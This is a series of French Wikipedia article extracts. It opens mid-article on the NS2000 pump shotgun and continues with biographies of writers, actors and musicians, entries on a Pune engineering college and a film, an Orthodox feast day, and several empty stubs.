Le NS2000 possède deux chargeurs tubulaires de six coups. Un sélecteur permet de choisir de recharger depuis l'un ou l'autre des tubes ou de les alterner. Dans le cadre d'une utilisation de contrôle des foules, cela permet de tirer des munitions sublétales depuis un tube et de très rapidement passer à des munitions conventionnelles en changeant de tube.
Une des variantes produites présente un canon plus court, d'une longueur de 457 mm, ce qui réduit les dimensions de l'arme à 589 mm. La capacité est alors réduite à 5 coups dans les magasins plus un coup dans la chambre.
Le mécanisme à pompe fonctionne dans un mouvement inversé au mouvement habituel des fusils à pompe. Il faut pousser la pompe vers l'avant pour ouvrir la culasse puis la ramener vers soi pour la refermer. Cela permet au tireur de plaquer le fusil contre son épaule avec la main posée sur la garde sans risquer d'actionner la culasse.
Le NS2000 est en vente sur le marché civil de différents pays depuis 2003 et s'est essentiellement vendu en Europe.
Dessins du brevet.
Dessin du brevet du NeoStead 2000.

</doc>
<doc id="7903383" url="https://fr.wikipedia.org/wiki?curid=7903383" title="Karl Otten">
Karl Otten

Karl Otten, né le à Oberkrüchten, dans la commune de Niederkrüchten en Allemagne et mort le à Minusio en Suisse, est un écrivain expressionniste allemand.
Biographie.
Karl Otten étudie la sociologie et l'histoire de l'art à l'université de Munich. En 1912, il voyage en Grèce, alors qu'éclate la guerre des Balkans. Il en tire un récit de voyage publié en 1913, salué par Kasimir Edschmid comme un exemple du « nouveau style » littéraire, à savoir l'expressionnisme.
Le , il s'exile de l'Allemagne nazie, et part pour l'Espagne où il participe à la guerre civile en 1936. Il réside ensuite à Londres, avant de s'établir en 1958 en Suisse.
Œuvre.
Au-delà de son œuvre littéraire, Karl Otten joue un rôle crucial dans la redécouverte de l'expressionnisme littéraire allemand. À partir de 1957, il se consacre à la publication de plusieurs anthologies qui font sortir de l'oubli une génération d'écrivains : "Ahnung und Aufbruch" (1958) consacré aux textes en prose, "Schrei und Bekenntnis" (1959) pour le théatre, "Das leere Haus" (1959) qui contient des textes en prose des auteurs expressionnistes juifs, "Expressionnismus - grotesk" (1962) et "Ego und Eros" (1963).

</doc>
<doc id="7903386" url="https://fr.wikipedia.org/wiki?curid=7903386" title="Hicham Dmii">
Hicham Dmii

Hicham Dmii est un entraîneur marocain de football, né le .
Palmarès.
En tant que joueur.
 Kawkab de Marrakech
En tant qu'entraîneur.
 Kawkab de Marrakech :

</doc>
<doc id="7903388" url="https://fr.wikipedia.org/wiki?curid=7903388" title="Armée du salut (homonymie)">
Armée du salut (homonymie)

Armée du salut peut désigner :
L'Armée du salut peut désigner :

</doc>
<doc id="7903392" url="https://fr.wikipedia.org/wiki?curid=7903392" title="Marcel Tillard">
Marcel Tillard

Marcel Tillard est un illustrateur français né à Orléans le et décédé dans cette ville le .
Biographie.
Après avoir étudié les Beaux-Arts à Tours puis à Paris, à la Libération, il illustre de nombreux ouvrages destinés à la jeunesse dont Gil Blas, Le Roman de Renart, Gargantua, puis travaille dans le quotidien français "Ce Soir".
À partir de 1952, il signe dans "L'Humanité", 410 bandes de grand format divisées en quatre illustrant un conte moyenâgeux de Jean-Pierre Chabrol "Le Barlafré". Le personnage principal, Brassebeuf, emprunte ses traits à Georges Brassens. Le succès entraîna une suite de rééditions : en album en 1955 par "L'Humanité", en 1978 par les éditions La Farandole puis en 1994 par Pressibus. 
En 1962, ses illustrations de "En gnomobile à travers l'Amérique" sont retenues pour une édition en langue anglaise du conte d'Upton Sinclair sous le titre "The gnomobile". Ce fut la seule diffusion de ses œuvres dans les pays anglophones.
En 1976, il illustre, sur un scénario de Jean Ollivier, "Les Contes d'un buveur de bière" adaptés par son épouse Lucette Martin.
Certaines de ses bandes dessinées sont reprises dans la presse régionale communiste comme "L'Écho du Centre" et "Gargantua" parut en 1994 dans "La Nouvelle République du Centre-Ouest".
Il a aussi illustré des contes pour enfants pour les Éditions Vaillant vers la fin des années 1950, ainsi que des auteurs publiés par les éditions La Farandole.

</doc>
<doc id="7903398" url="https://fr.wikipedia.org/wiki?curid=7903398" title="A Great Big World">
A Great Big World

 est un groupe pop américain composé de et Chad King. Le duo new-yorkais est essentiellement connu pour les chansons "This Is the New Year", reprise dans un épisode de la saison 4 de "Glee", et "Say Something", devenue un tube international depuis qu'ils l'ont réenregistrée avec Christina Aguilera en 2013. La chanson a d'ailleurs été récompensée aux Grammy Awards 2015.
Leur deuxième album, "When The Morning Comes", est sorti le .
Biographie.
Membres.
Ian Axel.
 naît le à Fair Lawn dans le New Jersey, au sein d'une famille juive. Il a fait sa bar mitzvah et est un juif séculier. Il est le deuxième enfant de Terry et Elyse Axel, et a une sœur appelée Melissa.
Il joue du piano depuis qu'il a 3 ans, et a composé son premier morceau au même âge. Il joue également du ukulélé.
Il a fait partie du groupe de rock du lycée de Fair Lawn, "The Boptones".
Après avoir obtenu son diplôme en , il part étudier à l'Université de Boston. Puis il intègre au cours de sa deuxième année l'Université de New York, où il rencontrera Chad King qui le poussera à chanter et lui paiera même son premier cours de chant. Ils deviendront colocataires vers 2007 et ne déménageront chacun de leur côté qu'en 2014, Ian s'installant avec sa petite amie.
Il travaille pendant deux ans et demi en tant que "personal shopper" dans un Apple Store à Manhattan, avant de démissionner pour devenir auteur-compositeur-interprète à plein temps. Il sortira ainsi un EP et un album en solo, avant de former A Great Big World avec Chad.
En , il annonce publiquement ses fiançailles avec sa petite amie Lina, qui est danseuse. Ils se marient le au Housing Works Bookstore Café à New York, et Chad est le témoin de Ian. Ils ont un fils, Bowie, né le .
Chad King.
Chad King naît le sous le nom de Chad Vaccarino. D'origine italienne, il est le troisième enfant de Joseph et Susan Vaccarino. Il grandit à Port Charlotte en Floride entouré de deux frères et une sœur : Joey, Chris et Carissa.
Il commence à chanter, danser et jouer la comédie à l'âge de 7 ans. Il prend ainsi 5 jours par semaine des cours d'acrobaties, de claquettes, de jazz, de ballet, de chant et de comédie au studio Stars of Tomorrow Dance de Viki Parkes à Port Charlotte, et se produit dans des théâtres et des maisons de retraite. À 10 ans, il interprète le rôle de Pinocchio, et danse dans les ballets "La Belle au Bois Dormant" et "Casse-Noisette". En , il joue dans un court-métrage appelé "Paul McCall" et apparaît dans un épisode de la série Kenan &amp; Kel.
À 16 ans, il veut devenir chanteur de country et écrit ses propres chansons avec un ami. Puis il tente sa chance au casting de American Idol mais est recalé dès la première audition. Au lycée, il joue de la trompette dans une fanfare.
En , il fait de la figuration dans le film Monster (avec Charlize Theron et Christina Ricci). Il a également prêté sa voix pour diverses publicités, et a été membre de la SAG-AFTRA pendant plusieurs années.
Il a exercé des petits boulots comme vendeur de ponchos à Universal Studios Florida et cuisinier chez McDonald's.
En , il révèle dans une vidéo postée sur la chaîne Youtube du groupe son combat contre la sclérose en plaques dont il a été diagnostiqué en 2007, alors qu'il était à l'université. Il explique que le régime paléo préconisé par le Dr ainsi qu'une bonne hygiène de vie lui ont permis de faire disparaître ses symptômes, alors que les médecins lui avaient dit qu'il serait paralysé d'ici 7 ans. Il profite de cette même vidéo pour révéler publiquement son homosexualité.
En , il annonce qu'il a décidé de changer de nom de famille, en grande partie en raison de déformations récurrentes. Il sera désormais Chad King, nom qu'il a choisi à partir d'un personnage du roman "Sur la route" de Jack Kerouac.
Carrière.
2005-2011 : Rencontre et débuts.
Ian Axel et Chad King se rencontrent à l'Université de New York où ils sont étudiants en business music au sein de la Steinhardt School of Culture, Education and Human Development. Ian cherche alors quelqu'un avec qui écrire une comédie musicale. Il ne connaît de Chad que sa capacité à jouer de la trompette, mais il insiste pour lui faire entendre ses chansons. D'abord réticent, Chad est immédiatement conquis à leur écoute. Il poussera alors Ian à se mettre à chanter.
Ils commencent rapidement à écrire et composer ensemble, mais Chad décide d'arrêter complètement de chanter et c'est en solo que Ian sort un premier EP en 2007, "I'm On to You", puis un album en 2011, "This Is The New Year". Toutes les chansons restent co-écrites par Chad, qui devient par ailleurs le manager de Ian. Certains de leurs morceaux sont utilisés dans la série télévisée Les Frères Scott, dans l'émission Good Morning America ou encore des programmes de la chaîne MTV comme .
Les paroles de "This Is The New Year" tenant à cœur à Chad (en particulier "Say everything you've always wanted / Be not afraid of who you really are"), il décide de l'interpréter avec Ian. Cette chanson lui redonne ainsi le courage de se remettre à chanter après avoir passé des années à se cacher derrière son ami.
En 2010, ils commencent à faire fréquemment des concerts ensemble. Ils font notamment les premières parties de Ingrid Michaelson, Matthew Morrison et Five for Fighting.
En 2011, leur chanson "This Is The New Year" est la chanson-titre de la bande originale du film Happy New Year.
Le duo a écrit et composé la chanson "Everyone Is Gay" pour l'organisation du même nom créée en 2010 par Kristin Russo et Dannielle Owens-Reid pour soutenir la jeunesse LGBTQ. Elles leur avaient ainsi demandé "la chanson la plus gay jamais écrite" pour le premier volume de "The Gayest Compilation Ever Made", sorti le .
2012-2013 : Création du groupe et signature chez Epic Records.
En juillet 2012, ils lancent une campagne Kickstarter afin d'enregistrer un EP de six titres, sur lesquels ils chantent tous les deux.
Deux mois plus tard, ils annoncent qu'ils ont décidé de former officiellement un groupe. Ils prennent alors le nom d'A Great Big World, tiré des paroles de leur chanson "Cheer Up!" : "It's a great big world and there's no need to cry".
Début 2013, "This is The New Year" est reprise dans un épisode de la saison 4 de Glee, ce qui leur permet de se faire connaître encore un peu plus ("Rockstar" sera également interprétée par le cast dans la saison 5). Ils signent au printemps chez Epic Records et sortent trois nouveaux titres en mai
2013-2014 : "Say Something" et "Is There Anybody Out There?".
Leur chanson ", écrite en 2009 et déjà présente sur l'album solo de Ian Axel sorti en 2011, est utilisée le dans l'émission américaine So You Think You Can Dance. Le titre monte alors dans les classements sur iTunes et certaines radios commencent à le diffuser. C'est ainsi que Christina Aguilera finit par les découvrir et les contacte une semaine plus tard pour leur proposer de réenregistrer la chanson avec elle. Début novembre, ils l'interprètent ensemble sur le plateau de The Voice, où Christina est une des coaches. Ils se font ainsi définitivement connaître et se retrouvent d'ailleurs au classement Billboard Digital Songs. Depuis, la chanson a atteint le top des classements dans de nombreux pays, et a notamment été certifiée cinq fois disque de platine aux États-Unis, et six fois disque de platine au Canada.
Leur premier album, ", sort le . Pour le clip du second single, "Already Home", Ian et Chad font appel à Darren Criss (Glee) et Jessica Szohr (Gossip Girl). Celui-ci sort le .
Ils co-écrivent et interprètent avec Ingrid Michaelson la chanson « Over You », qui figure sur son album "Lights Out" sorti le . À l'instar de "Say Something", la chanson est utilisée dans So You Think You Can Dance le .
En , ils font la première partie de la violoniste Lindsey Stirling en Allemagne, en Pologne et au Luxembourg.
Le , ils remportent un Grammy Award pour "Say Something" dans la catégorie avec Christina Aguilera.
2015-présent : "When The Morning Comes" et "Strokes of Genius".
Le , ils dévoilent "Hold Each Other" avec la participation du rappeur Futuristic, premier single de leur second album "When The Morning Comes" sorti le . Ont notamment collaboré sur cet album Gregg Wattenberg, Derek Fuhrmann, , , , Antonina Armato, , Kevin Kadish, , ou encore .
Le , ils annoncent pour les mois de mars et avril le Kaleidoscope Tour, une tournée de 26 dates à travers les États-Unis et le Canada. Puis ils font à l'été de la même année la première partie de Phillip Phillips et Matt Nathanson sur une partie de leur tournée.
Ils écrivent depuis plusieurs années une comédie musicale pour Broadway ayant pour thème la famille, mais pas entendu dans un sens conventionnel. En été 2015, ils disent avoir terminé la première ébauche et être à la recherche d'un metteur en scène. Après avoir été intitulée provisoirement "Two Blocks Away", son nouveau titre est pour le moment "Strokes of Genius". Ils en présentent les chansons lors d'un concert au le , accompagnés de leurs musiciens et de leurs invités : Darren Criss, Lena Hall, , et Honey Larochelle.
Ian et Chad préparent actuellement avec leurs musiciens leur troisième album prévu pour 2018.
Chansons utilisées dans les médias.
En France, la musique d'A Great Big World a notamment été utilisée dans des émissions comme The Voice, L'Amour est dans le Pré ou encore Un Trésor dans Votre Maison. Say Something a par ailleurs été reprise par Anne Sila et Florent Pagny lors de la finale de la saison 4 de The Voice, diffusée le .

</doc>
<doc id="7903411" url="https://fr.wikipedia.org/wiki?curid=7903411" title="The Grey Fox">
The Grey Fox

 est un film canadien réalisé par Phillip Borsos, sorti en 1982.

</doc>
<doc id="7903416" url="https://fr.wikipedia.org/wiki?curid=7903416" title="Stéphane Bak">
Stéphane Bak

Stéphane Bak, né le à Villepinte (Seine Saint-Denis) et ayant grandi dans la cité des Tilleuls au Blanc-Mesnil, est un acteur français d'origine congolaise.
Reconverti dans le cinéma à la suite de débuts artistiques dans le milieu de l’humour, il a notamment occupé le premier rôle dans "Twist à Bamako" (2021) et le succès critique "Un petit frère" (2023). Il prête également sa voix à Miles Morales dans la version française de ' et '.
Il est l’égérie de la marque de haute couture Loewe et l’ambassadeur de Cartier pour la haute joaillerie.
Biographie.
Jeunesse.
Originaire de la république du Congo par ses parents, Stéphane Bak est le fils d’un bagagiste à l'aéroport parisien Charles de Gaulle et d’une agent d’accueil ayant émigré en France dans les années 1980. Le futur comédien grandit avec ses quatre frères et sœurs dans la commune du Blanc-Mesnil (Seine-Saint-Denis), y demeurant jusque ses 21 ans, dans la cité des Tilleuls au sein d'une zone urbaine sensible.
En 2011, il est renvoyé du Collège Nelson Mandela (Le Blanc-Mesnil) du fait de nombreuses indisciplines et poursuit dès lors sa scolarité par correspondance. Il obtient une autorisation de la DDASS pour commencer à travailler à l'âge de 14 ans, ce qui lui permet de faire ses débuts dans le milieu humoristique. En 2012, il reçoit une formation de comédien au Cours Florent.
Par la suite, sa carrière s'oriente progressivement vers le métier d'acteur.
Spectacles humoristiques et présence audiovisuelle (2010-2014).
En 2010, Stéphane Bak entreprend de devenir humoriste de stand up. Il rencontre Emmanuel Smadja, directeur du café-théâtre parisien Le Pranzo, après s'être vu refuser l'entrée du Comedy Club de Jamel Debbouze du fait de son âge. Emmanuel Smadja lui propose de venir se produire dans son établissement à partir du mois de décembre. Il présente ensuite son premier sketch, "Je m’appelle Stéphane Bak", dans plusieurs cafés-théâtres et petites salles parisiennes, tels que le Paname, le Palace ou le théâtre Trévise. Ceci lui permet de commencer à acquérir de la notoriété dans le milieu et lui vaut plusieurs sollicitations, sous la publicité de « plus jeune comique de France ». En 2011, il participe au festival du rire de Montreux avec les Chevaliers du fiel et réalise les premières parties d'Anthony Kavanagh à l'Olympia. De plus, il se produit par deux fois au Grand Rex : d'abord invité par Jamel Debbouze dans le cadre de la soirée "Carte blanche à Jamel Debbouze" puis lors de la soirée "Rire ensemble contre le racisme" diffusée en sur France 2 devant deux millions de téléspectateurs. Le , moins d'un an après le début de sa carrière, il prend part à la "Nuit de l'Outre-mer" sur la scène de l'Accor Arena de Paris.
Il entre la même année dans le giron d’Harry Tordjman, producteur de la série "Bref" dont il prend part à un épisode. En , il intervient quotidiennement au "Grand Journal" dans le cadre du Festival de Cannes, présentant des sketchs courts co-écrits par Kyan Khojandi et Bruno Muschio. Il rejoint par la suite l’équipe de l’émission pour la rentrée audiovisuelle 2012. Il prend alors en charge une rubrique humoristique du nom de "Bakstage", dans laquelle il se met en scène dans les coulisses de l’émission, allant à la rencontre des intervenants et des invités. Son parcours télévisuel se poursuit en janvier 2014 lorsqu'il intègre l'équipe du nouveau programme de France 2 en "access prime time", "L'Émission pour tous" de Laurent Ruquier. Il propose une rubrique humoristique quotidienne revenant sur les dernières vingt-quatre heures de télévision. Il office en parallèle dans deux émissions de radio : "On va s'gêner" sur Europe 1 entre 2012 et 2014 et "Enora Le Soir" sur Virgin Radio entre 2013 et 2014.
Alors que son premier spectacle, co-écrit avec Bruno Muschio, est initialement annoncé pour janvier 2013, celui-ci ne voit finalement pas le jour, l'humoriste s'orientant alors vers le métier d'acteur.
Débuts en tant qu'acteur (2014-2019).
Stéphane Bak connaît ses premières apparitions cinématographiques en 2013. Âgé de 16 ans, il occupe des rôles secondaires dans deux comédies, "Les Profs" de Pierre-François Martin-Laval et "Les Gamins" d'Anthony Marciano. À ce moment, il souhaite toutefois opérer une évolution et une diversification de sa carrière et ne souhaite pas se cantonner à des projets de comédie, afin de se départir de son étiquette d'humoriste. Lors d'un entretien avec "Le Monde" en 2021, il déplorera les rôles « discriminants et peu inventifs » qui lui sont proposés au sein de comédies au début de sa carrière cinématographique, à l'image d'un « gag où [il] sourit dans le noir » et est reconnu « grâce à [ses] dents » dans un film qui réalisera plus de quatre millions d'entrées et les « répercussions » que peuvent engendrer le fait de jouer un « rôle stéréotypé ».
Il décroche en 2014 son premier second rôle dans "Les Héritiers" de Marie-Castille Mention-Schaar, comédie dramatique relatant l'histoire d'une classe de seconde se présentant au Concours national de la résistance et de la déportation. Le film est plutôt salué par la critique. Il fait l'objet d'une projection au palais de l'Élysée en présence du président de la République, François Hollande, en , peu avant la sortie en salles.
En 2015, il est l'acteur principal du clip "The Girl is Mine" de 99 Souls avec la participation des Destiny's Child et de Brandy. Le clip est nommé aux MTV Video Music Awards dans la catégorie « meilleur clip vidéo électronique ».
En 2016, il intègre la distribution de "Elle" de Paul Verhoeven, César du meilleur film en 2017, et joue le rôle de Jules dans "L'Outsider" de Christophe Barratier, ayant pour objet l'histoire de Jérôme Kerviel. Il décroche son premier rôle principal en 2017 dans "Seuls" de David Moreau, prêtant ses traits à Dodji dans l'adaptation cinématographique de la bande dessinée. En 2018, Jean-Philippe Puymartin et Béatrice Delfe le repèrent et il connaît sa première expérience de doublage en prêtant sa voix à Miles Morales, le héros de . Le film décroche l'Oscar du meilleur film d'animation en 2019.
Une carrière cinématographique en expansion (depuis 2019).
Les années qui suivent sont pour lui l'occasion de premiers tournages à l'international. Il officie premièrement dans la production franco-belgo-rwandaise de Joël Karekezi "La Miséricorde de la Jungle", multi-primée aux African Movie Academy Awards de 2019. Il occupe le second rôle, celui d'un orphelin de guerre devenu le soldat Faustin, dans ce film portant sur la Deuxième guerre du Congo. Le film est d'abord présenté au Festival international du film de Toronto. À cette occasion, le festival le sélectionne en tant qu'acteur à suivre de la nouvelle génération au sein de son programme "Rising Stars". En 2019, il tourne pour la première fois intégralement en langue anglaise dans "Roads" de Sebastian Schipper. Dans ce drame présenté en avant-première au Festival du Film de Tribeca, Stéphane Bak joue un jeune congolais prêt à rejoindre l'Europe au péril de sa vie afin d'y retrouver son frère. Il est alors présenté par "Télérama" comme un « acteur à suivre ».
La même année, il est remarqué dans un autre film dramatique, "L'Adieu à la nuit" d'André Téchiné qui rencontre un succès critique. Il poursuit dans ce registre en tenant le second rôle dans "Tokyo Shaking" d'Olivier Peyon, où il donne la réplique à Karine Viard. Le réalisateur lui confie le rôle d'Amani, stagiaire au sein de la branche japonaise d'une grande banque française, au moment où le pays doit affronter le tsunami de 2011 et l'accident nucléaire de Fukushima. Le film sort en salles en 2021. Il apparaît quelques mois plus tard dans la distribution de "The French Dispatch" de Wes Anderson en tant que spécialiste des télécommunications.
En 2022, Stéphane Bak occupe aux côtés d'Alice Da Luz le premier rôle de "Twist à Bamako", film de Robert Guédiguian se déroulant au temps du Mali socialiste de Modibo Keita. Débuté en au Sénégal, le tournage du film est interrompu du fait de la pandémie de la covid-19 avant de reprendre en . Stéphane Bak joue le rôle de Samba, un révolutionnaire socialiste voyant ses idéaux politiques et amoureux menacés.
Quelques mois plus tard, le film "Un petit frère" de Léonor Seraille, dans lequel il occupe le premier rôle, est choisi au sein de la sélection officielle (en compétition) du Festival de Cannes. Bak joue le rôle de Jean, l'un des deux fils de Rose, dans ce drame qui suit l'histoire d'une famille ivoirienne émigrant en partie en France. Le film, salué par la critique, y compris hors de France, sort en salles en février 2023. Lors du Festival de Cannes 2022, Bak est également présent au générique de Novembre de Cédric Jimenez, production présente dans la sélection officielle mais hors compétition. Il joue le rôle de Djibril, un officier de la SDAT, dans ce film consacré à l'enquête policière suivant les attentats du 13 novembre 2015. Le film est second au box-office français en 2022, avec plus de deux millions d'entrées.
En 2023, il réalise à nouveau le doublage français de Miles Morales dans le film d'animation , suite en salles de "Spider-Man: New Generation". Il collabore de nouveau avec deux réalisateurs avec lesquels il a travaillé précédemment. D'abord avec Wes Anderson en apparaissant dans Asteroid City, film intégré à la sélection officielle du Festival de Cannes ; ainsi qu'avec André Téchiné dans Les âmes sœurs dont la distribution comprend Noémie Merlant et Benjamin Voisin. Il est ensuite juré au 49ème Festival du film américain de Deauville, présidé par Guillaume Canet.
Mode.
Il fait partie depuis 2020 des ambassadeurs de la maison de prêt-à-porter de luxe Loewe. Cela concrétise la relation entre Bak et Loewe née d’une prise de contact avec Jonathan Anderson, directeur artistique de la maison, à l’occasion de la Berlinale de 2019. En 2023, il est égérie du parfum Botanical Rainbow, en compagnie de Greta Lee et Úrsula Corberó.
Il est ambassadeur de la gamme de haute joaillerie de Cartier à partir de 2023 et égérie de la collection "Le Voyage Recommencé".
Divers.
Il est supporter de l'équipe de football du Paris Saint-Germain. Il est sporadiquement invité sur les plateaux de télévision pour réagir à l'actualité du club, tel qu'en 2013 dans "La Nouvelle Édition" à la suite du titre de champion de France remporté par l'équipe, ainsi qu'en 2017 dans l'émission de "Quotidien" consécutive à l'élimination en Ligue des Champions contre le FC Barcelone.
Vie privée.
Stéphane Bak est un ami proche de l'acteur Timothée Chalamet.
En , la presse le photographie à Paris, en train d'embrasser la mannequin Emily Ratajkowski.

</doc>
<doc id="7903420" url="https://fr.wikipedia.org/wiki?curid=7903420" title="Planètes chthoniennes">
Planètes chthoniennes



</doc>
<doc id="7903426" url="https://fr.wikipedia.org/wiki?curid=7903426" title="Europa Anders">
Europa Anders



</doc>
<doc id="7903435" url="https://fr.wikipedia.org/wiki?curid=7903435" title="Neri">
Neri



</doc>
<doc id="7903440" url="https://fr.wikipedia.org/wiki?curid=7903440" title="Berthe Bady">
Berthe Bady

Berthe Bady, née le à Lodelinsart (Belgique) et morte le à Jouy (Eure-et-Loir), est une actrice française d'origine belge. 
Elle donnera l'année 1872 comme date de naissance pendant toute sa carrière.
Biographie.
Berthe Florence Bady fut élevée au Couvent du Sacré-Cœur de Dour puis s'inscrivit au conservatoire de Bruxelles en 1891 avant de rejoindre le théâtre du Vaudeville en 1894. Elle accompagna Lugné-Poe dans la naissance du Théâtre de l'Œuvre. Égérie d'Henry Bataille, elle joua ensuite au Théâtre de l'Odéon de 1901 à 1904.
Fernand Crommelynck lui dédia sa pièce "Les Amants puérils". Louis Aragon évoque sa mort dans "Blanche ou l'oubli"
Berthe Bady fut la compagne de Lugné-Poe et la muse d'Henry Bataille. Les fortunes qu'elle avait gagnées comme actrice furent consacrées à son ménage avec Henry Bataille. Berthe Bady mourut dans l'isolement et la misère, seule, à l'hôtel.
Elle repose au cimetière du Montparnasse ().

</doc>
<doc id="7903443" url="https://fr.wikipedia.org/wiki?curid=7903443" title="Henry Porter (dramaturge)">
Henry Porter (dramaturge)

Henry Porter (mort le d'un coup d'épée) était un dramaturge anglais, qui est connu pour la seule pièce de lui qui nous soit parvenue : "The Two Angry Women of Abington". Il est mort après avoir reçu un coup d'épée d'un certain « John Daye, yeoman », qui serait son collègue dramaturge John Day, qui a apparemment poursuivi sa carrière comme si de rien n'était.
Biographie.
On ne connaît quasiment Porter que par les entrées le concernant dans le livre de comptes de Henslowe entre le et le . Il y est désigné comme un « gentleman » ou comme un « universitaire pauvre ».
Les versements de Henslowe à Porter en 1596 et 1597 ne précisent pas de quels ouvrages il est question. Le , Henslowe paie à Thomas Dowton et à « Mr. Porter » pour une pièce intitulée "Love Pretended". Le , Henslowe achète une pièce appelée "Hot Anger soon Cold" à Porter, Chettle et Jonson. Le de cette même année, il achète la seconde partie de "Two Angry Women of Abington" de Porter. Le , Porter promet à Henslowe de lui apporter toutes ses compositions, qu'il les écrive seul ou en collaboration, contre une avance de pour son "Two Merry Women of Abington". Le de cette année, Henslowe achète "The Spencers" de Porter et Chettle, puis il accorde à Porter plusieurs petites avances. Francis Meres, dans son "Palladis Tamia" (1598), classe Porter parmi les meilleurs bâtisseurs d'intrigues avec Chapman, Wilson, Hathway et Chettle.  Gayley note que tous ces auteurs étaient à cette époque des associés de Porter, travaillant pour Henslowe et la troupe de l'amiral.
Une des épigrammes de , s'adresse en 1598 à un certain « Henricum Porter », décrivant un homme d'âge mûr, qui est probablement un autre Henry Porter, diplômé de musique de Christ Church (Oxford) et père de Walter Porter.
Le , un collègue dramaturge, John Day, frappe Porter avec une rapière, sans que l'on sache s'il s'agissait d'un duel ou d'un assassinat. Porter meurt le lendemain, illustrant la violence de l'époque à Londres. Quelques mois auparavant, un autre collègue de Porter, Jonson, avait tué l'acteur Gabriel Spencer en duel à l'épée.
Œuvres.
La seule pièce de Porter qui nous soit parvenue est "The Pleasant Historie of the two Angrie Women of Abington", jouée par la troupe de l'amiral, et publiée à Londres en 1599, suivie par une seconde édition in-quarto la même année. Ce sont ces éditions qui ont probablement permis sa sauvegarde. Cette pièce a été rééditée en 1841 par William Carew Hazlitt, puis par Havelock Ellis en 1888 dans "The Mermaid Series". Charles Lamb en a donné des extraits dans les "Garrick Plays", la jugeant « point du tout inférieure à la pièce "La Comédie des erreurs" ou à "La Mégère apprivoisée" » (toutes deux de Shakespeare). Lamb poursuit en précisant que les scènes nocturnes sont particulièrement alertes et gaies, et la versification riche et déliée. Cette pièce se déroule à Abington, un village proche d'Oxford. Comme l'auteur semble bien connaître la région d'Oxford, on a supposé que Porter a étudié dans cette université. Mais toutes les tentatives pour identifier le dramaturge avec un des Henry Porter enregistrés à Oxford se sont révélées vaines.
On connaît quatre autres pièces de Porter, mais seulement par le titre :

</doc>
<doc id="7903444" url="https://fr.wikipedia.org/wiki?curid=7903444" title="Ermanno Rea">
Ermanno Rea

Ermanno Rea, né le à Naples (Campanie) et mort le à Rome (Latium), est un journaliste et un écrivain italien.
Biographie.
Les livres d'Ermanno Rea sont essentiellement des enquêtes sur des cas personnels comme celle sur l'économiste Federico Caffè. Pour "La dismissione", Rea est retourné à Naples pour suivre le démantèlement de l'aciérie Ilva de Bagnoli. 
Il a remporté le prix Viareggio avec son roman autobiographique "Mystère napolitain" ("Mistero napolitano") et le prix Campiello avec "Fuochi fiammanti a un'hora di notte". "Napoli ferrovia" a été finaliste du prix Strega en 2008.
Ermanno Rea est tête de liste de L'Autre Europe pour les élections européennes de 2014.

</doc>
<doc id="7903459" url="https://fr.wikipedia.org/wiki?curid=7903459" title="Collège d'ingénierie de Pune">
Collège d'ingénierie de Pune

Le collège d'ingénierie de Pune (en anglais, le , ou COEP) est une école d'ingénieurs autonome avec une affiliation à l'Université de Pune, dans le Maharashtra, en Inde. Fondée en 1854, elle est la troisième plus ancienne école d'ingénieurs en Asie, après le (fondé en 1794) et l' (fondé en 1847). Les étudiants et diplômés du COEP sont familièrement appelés . Au début des années 1950, on se référait au modèle d'étude de l'université comme étant le « modèle Poona » ().
Histoire.
Le collège a été l'un des tout premiers fondés par les Britanniques pour desservir l'ensemble du sous-continent indien. La première pierre du nouveau collège a été posée par le gouverneur, Sir Henry Bartle Frere, qui devait devenir le vice-chancelier de l'université, le 5 août 1865. En juin de l'année suivante, Theodore Cooke M.A. fut nommé directeur du collège. Il devait occuper ce poste pendant les 28 années suivantes.
Le collège fut fondé au départ sous le nom de pour former des cadres subalternes chargés de travaux de génie civil tels que des barrages, des canaux, des chemins de fer, des ponts et autres bâtiments.
En juillet 1857, Henry Coke fut chargé de diriger l'institut. Chaun pouvait y être admis, sans distinction de nationalité ou de caste, à condition d'avoir une bonne maîtrise de l'anglais et une connaissance de base des mathématiques. Pour pouvoir être admis, le candidat devait tout d'abord déposer sa candidature auprès de l'école gouvernementale anglaise la plus proche, où on lui remettait les documents de l'examen d'entrée. Le proviseur faisait passer l'examen à une date qui lui convenait, et remettait les réponses du candidat à Henry Coke, responsable de l'école de mécanique. Après examen de ces réponses, Cokes informait le proviseur de l'école du nom des candidats qu'il jugeait dignes d'être admis. Des bourses de six roupies par mois étaient offertes à 15 élèves après une période de six mois d'études à l'école de mécanique. Les cours proposés incluaient les mathématiques, le dessin, l'arpentage et le nivellement et la construction. Les études duraient deux ans.

</doc>
<doc id="7903464" url="https://fr.wikipedia.org/wiki?curid=7903464" title="Too Much Flesh">
Too Much Flesh

"Too Much Flesh "est un film français réalisé par Jean-Marc Barr, sorti en 2000.
Synopsis.
Dans l'Illinois, un trentenaire découvre la sexualité avec une étrangère. Leurs actions vont peu à peu déteindre sur d'autres personnages jusqu'à susciter des réactions dans la bourgade rurale et plutôt puritaine.

</doc>
<doc id="7903471" url="https://fr.wikipedia.org/wiki?curid=7903471" title="Dimanche de la Samaritaine">
Dimanche de la Samaritaine

Le dimanche de la Samaritaine est le cinquième dimanche après Pâques (P + 28). Dans les Églises d'Orient ce dimanche commémore la rencontre entre Jésus et la Samaritaine près de la fontaine de Jacob (Jean, ). La Samaritaine est appelée traditionnellement Photine, ou Svetlana dans la tradition slavonne.
Selon la tradition orientale, la Samaritaine "égale des apôtres" fut baptisée par les apôtres "Photine", c'est-à-dire "lumineuse". Après sa rencontre avec Jésus, elle se convertit. Elle se répandit dans la ville pour proclamer la gloire de Jésus et elle est pour cela considérée comme la première évangéliste. Elle convertit ses sœurs (Anatole, Photo, Photis, Paraskeve, et Kyriake) ainsi que ses deux fils (Photinos, auparavant appelé Victor, et Joses). Photine proclama le Christ en divers lieux et partit pour Carthage afin de convertir la région. Elle aurait été martyrisée sous Néron avec Sébastien qui était un proche ami.
Hymnographie.
&lt;poem&gt;
&lt;/poem&gt;

</doc>
<doc id="7903487" url="https://fr.wikipedia.org/wiki?curid=7903487" title="Cecil D. Andrus">
Cecil D. Andrus

Cecil Dale Andrus, né le à Hood River (États-Unis) et mort le à Boise(États-Unis), est un écrivain et homme politique américain.
Membre du Parti démocrate, il est gouverneur de l'Idaho entre 1971 et 1977 et entre 1987 et 1995 ainsi que secrétaire à l'Intérieur des États-Unis entre 1977 et 1981 dans l'administration du président Jimmy Carter.

</doc>
<doc id="7903506" url="https://fr.wikipedia.org/wiki?curid=7903506" title="Roland Boudet">
Roland Boudet

